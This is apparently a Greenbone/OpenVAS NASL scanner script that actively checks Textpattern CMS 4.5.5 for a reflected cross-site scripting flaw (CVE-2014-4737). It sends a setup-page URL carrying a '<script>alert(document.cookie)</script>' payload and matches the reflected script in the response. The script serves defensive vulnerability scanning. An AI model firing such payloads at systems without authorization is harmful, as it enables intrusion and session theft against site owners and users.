CPE = "cpe:/a:textpattern:textpattern";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.804499" );
	script_version( "2021-07-06T10:30:25+0000" );
	script_tag( name: "last_modification", value: "2021-07-06 10:30:25 +0000 (Tue, 06 Jul 2021)" );
	script_tag( name: "creation_date", value: "2014-10-16 16:06:39 +0530 (Thu, 16 Oct 2014)" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_cve_id( "CVE-2014-4737" );
	script_tag( name: "qod_type", value: "remote_analysis" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "Textpattern CMS 'index.php' XSS Vulnerability - Active Check" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_textpattern_cms_http_detect.sc" );
	script_mandatory_keys( "textpattern_cms/http/detected" );
	script_require_ports( "Services/www", 80 );
	script_tag( name: "summary", value: "Textpattern CMS is prone to cross-site scripting (XSS)
  vulnerability." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP GET request and checks the response." );
	script_tag( name: "insight", value: "The flaw exists due to insufficient sanitization of input data
  passed via URI after '/textpattern/setup/index.php' script." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary
  HTML and script code in a user's browser session in the context of an affected site." );
	script_tag( name: "affected", value: "Textpattern CMS version 4.5.5 and probably prior." );
	script_tag( name: "solution", value: "Update to version 4.5.7 or later." );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/96802" );
	script_xref( name: "URL", value: "https://www.htbridge.com/advisory/HTB23223" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/128519/" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/archive/1/533596/100/0/threaded" );
	script_xref( name: "URL", value: "http://textpattern.com/weblog/379/textpattern-cms-457-released-ten-years-on" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/setup/index.php/\"><script>alert(document.cookie);</script>/index.php";
if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "<script>alert\\(document\\.cookie\\);</script>", extra_check: ">Welcome to Textpattern<" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

